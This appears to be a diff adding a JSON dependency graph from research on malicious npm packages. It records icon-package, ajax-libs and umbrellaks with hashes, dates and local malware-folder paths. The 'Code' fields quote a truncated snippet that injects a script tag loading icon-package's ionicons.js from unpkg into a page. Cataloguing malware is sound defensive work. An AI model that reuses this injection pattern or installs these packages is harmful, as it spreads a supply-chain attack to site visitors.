@@ -1,0 +1,75 @@
+{
+    "directed": true,
+    "multigraph": false,
+    "graph": {},
+    "nodes": [
+        {
+            "yuan": "Maloss",
+            "id": "icon-package-9.0.0",
+            "Source": "Maloss",
+            "Filepath": "/Users/xxxx/Documents/malware/npm/maloss/icon-package-9.0.0.tgz",
+            "path": "/Users/xxxx/Documents/malware/npm/maloss/icon-package-9.0.0_extracted",
+            "name": "icon-package",
+            "version": "9.0.0",
+            "published_at": "2022-05-21T03:06:37.839Z",
+            "Status": "tracked",
+            "OSS": "NPM",
+            "description": NaN,
+            "author": NaN,
+            "maintainers": NaN,
+            "repository_url": "Does not contain a repository URL.",
+            "dependencies": NaN,
+            "SHA-256": "309e9ba5a4a14c8fce2ae85404a109c852d19bdbc6388e5ec75805b0b3a82883"
+        },
+        {
+            "yuan1": "Maloss",
+            "File": "/Users/xxxx/Documents/malware/npm/maloss/ajax-libs-9.0.3_extracted/ajax-libs-9.0.3_sourcecode.js",
+            "Code": "e = \"text/javascript\", e.src = \"https://unpkg.com/icon-package@9.0.0/ionicons.js\", document.body.app",
+            "id": "ajax-libs-9.0.3",
+            "Source": "Maloss",
+            "Filepath": "/Users/xxxx/Documents/malware/npm/maloss/ajax-libs-9.0.3.tgz",
+            "path": "/Users/xxxx/Documents/malware/npm/maloss/ajax-libs-9.0.3_extracted",
+            "name": "ajax-libs",
+            "version": "9.0.3",
+            "published_at": "2022-05-26T15:47:16.987Z",
+            "Status": "tracked",
+            "OSS": "NPM",
+            "description": NaN,
+            "author": NaN,
+            "maintainers": NaN,
+            "repository_url": "Does not contain a repository URL.",
+            "dependencies": NaN,
+            "SHA-256": "1cb07e5eef5d8c7f03de930ed42a4e27f0a963f038b099f0bee023d5a1ecda61"
+        },
+        {
+            "yuan1": "Maloss",
+            "File": "/Users/xxxx/Documents/malware/npm/maloss/umbrellaks-1.0.0_extracted/umbrellaks-1.0.0_sourcecode.js",
+            "Code": "e = \"text/javascript\", e.src = \"https://unpkg.com/icon-package@9.0.0/ionicons.js\", document.body.app",
+            "id": "umbrellaks-1.0.0",
+            "Source": "Maloss",
+            "Filepath": "/Users/xxxx/Documents/malware/npm/maloss/umbrellaks-1.0.0.tgz",
+            "path": "/Users/xxxx/Documents/malware/npm/maloss/umbrellaks-1.0.0_extracted",
+            "name": "umbrellaks",
+            "version": "1.0.0",
+            "published_at": "2022-06-03T14:29:06.571Z",
+            "Status": "tracked",
+            "OSS": "NPM",
+            "description": NaN,
+            "author": NaN,
+            "maintainers": NaN,
+            "repository_url": "Does not contain a repository URL.",
+            "dependencies": NaN,
+            "SHA-256": "a71da5918b496cb6ced60799639a8e3ea509eaac0090938b7028e1b754014072"
+        }
+    ],
+    "links": [
+        {
+            "source": "ajax-libs-9.0.3",
+            "target": "icon-package-9.0.0"
+        },
+        {
+            "source": "umbrellaks-1.0.0",
+            "target": "icon-package-9.0.0"
+        }
+    ]
+}
